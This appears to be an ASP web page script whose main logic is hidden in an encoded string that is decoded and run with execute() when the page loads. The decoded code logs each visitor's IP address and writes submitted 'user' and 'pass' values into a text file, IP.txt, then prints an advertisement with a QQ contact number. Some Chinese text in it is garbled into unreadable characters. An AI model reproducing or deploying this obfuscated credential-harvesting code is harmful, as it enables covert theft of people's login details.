<%
darkst="!!!!!��!!Ejn!!!WbmjeFousz!!!!!��!!WbmjeFousz!!!>!!!Usvf!!!��!!Jg!!!opu!!!JtFnquz)Tfttjpo)#MphJo#**!!!uifo!!!WbmjeFousz!!!>!!!Gbmtf!!!��!!Jg!!!WbmjeFousz!!!Uifo!!!!!��!!Dpotu!!!GpsBqqfoejoh!!!>!!!9!!!��!!Dpotu!!!Dsfbuf!!!>!!!usvf!!!��!!Ejn!!!GTP!!!��!!EJN!!!UT!!!��!!EJN!!!NzGjmfObnf!!!��!!(Ejn!!!tusMph!!!��!!Ejn!!!tusUjnf-tusVsm-tusPqpsbujpo-tusVtfsBhfou!!!��!!!!��!!NzGjmfObnf!!!>!!!Tfswfs/NbqQbui)#JQ/uyu#*!!!��!!Tfu!!!GTP!!!>!!!Tfswfs/DsfbufPckfdu)#Tdsjqujoh/GjmfTztufnPckfdu#*!!!��!!Tfu!!!UT!!!>!!!GTP/PqfoUfyuGjmf)NzGjmfObnf-!!!GpsBqqfoejoh-!!!Dsfbuf*!!!��!!!!��!!tusVsm>Sfrvftu/TfswfsWbsjbcmft)#SFNPUF`BEES#*!!!'!!!#!!!#!!!��!!!!��!!(!!!Xsjuf!!!dvssfou!!!jogpsnbujpo!!!up!!!Mph!!!Ufyu!!!Gjmf/!!!��!!Ut/xsjufmjof!!!#....���������ķָ���....#!!!��!!Ut/xsjufmjof!!!#������JQ��#'tusVsm!!!��!!(!!!Dsfbuf!!!b!!!tfttjpo!!!wbsjbmcf!!!up!!!difdl!!!ofyu!!!ujnf!!!gps!!!WbmjeFousz!!!��!!Tfttjpo)#MphJo#*!!!>!!!#zft#!!!��!!Tfu!!!UT!!!>!!!Opuijoh!!!��!!Tfu!!!GTP!!!>!!!Opuijoh!!!��!!Foe!!!Jg!!!��ovn>sfrvftu)#vtfs#*��qbtt>sfrvftu)#qbtt#*��iyjq>sfrvftu)#jq#*��tfu!gt>tfswfs/DsfbufPckfdu)#Tdsjqujoh/GjmfTztufnPckfdu#*��tfu!gjmf>gt/PqfoUfyuGjmf)tfswfs/NbqQbui)#JQ/uyu#*-9-Usvf*��jg!iyjq!=?##!uifo��gjmf/xsjufmjof!ovn,#....#,qbtt,#....jq;#,iyjq��fmtf��gjmf/xsjufmjof!ovn,#....#,qbtt��foe!jg��gjmf/dmptf��tfu!gjmf>opuijoh��tfu!gt>opuijoh��sftqpotf/xsjuf!#������449:��¼��������BTQ���Ű�,��JQ!��ϵRR!51:484894!!RRȺ;72312378#��!��"
execute(UnEncode(darkst))
function UnEncode(temp)
    but=1
    for i = 1 to len(temp)
        if mid(temp,i,1)<>"��" then
            If Asc(Mid(temp, i, 1)) < 32 Or Asc(Mid(temp, i, 1)) > 126 Then
                a = a & Chr(Asc(Mid(temp, i, 1)))
            else
                pk=asc(mid(temp,i,1))-but
                if pk>126 then
                    pk=pk-95
                elseif pk<32 then
                    pk=pk+95
                end if
                a=a&chr(pk)
            end if
        else
            a=a&vbcrlf
        end if
    next
    UnEncode=a
end function
%>
